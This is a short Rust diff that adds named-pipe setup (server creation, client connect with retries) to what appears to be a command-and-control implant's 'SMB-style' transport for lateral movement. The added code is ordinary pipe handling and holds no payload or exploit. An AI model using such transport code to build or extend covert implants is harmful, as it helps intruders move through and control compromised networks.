@@ -6,7 +6,9 @@ use anyhow::Result;
 use cloakcat_protocol::{Command, FileChunk, RegisterReq, RegisterResp, ResultReq};
 
 use super::Transport;
-use crate::io::win_pipe::PipeHandle;
+use crate::io::win_pipe::{
+    self, PipeHandle,
+};
 use crate::utils::rand_hex;
 
 /// SMB-style named-pipe transport for local or lateral IPC.
@@ -29,6 +31,27 @@ impl PipeTransport {
             is_server,
             handle: None,
         }
+    }
+
+    /// Initialise the underlying pipe connection.
+    ///
+    /// - **Server mode**: creates the named pipe, then blocks until a client connects.
+    /// - **Client mode**: connects to an existing pipe with up to 3 retries (5 s timeout each).
+    pub fn init(&mut self) -> Result<()> {
+        let raw = if self.is_server {
+            let h = win_pipe::create_pipe_server(&self.pipe_name)?;
+            win_pipe::accept_connection(h)?;
+            h
+        } else {
+            win_pipe::connect_pipe_client_retry(&self.pipe_name, 3, 5000)?
+        };
+        self.handle = Some(PipeHandle::from_raw(raw));
+        Ok(())
+    }
+
+    /// Return the pipe name (e.g. `\\.\pipe\ipc_deadbeef`).
+    pub fn pipe_name(&self) -> &str {
+        &self.pipe_name
     }
 }
 
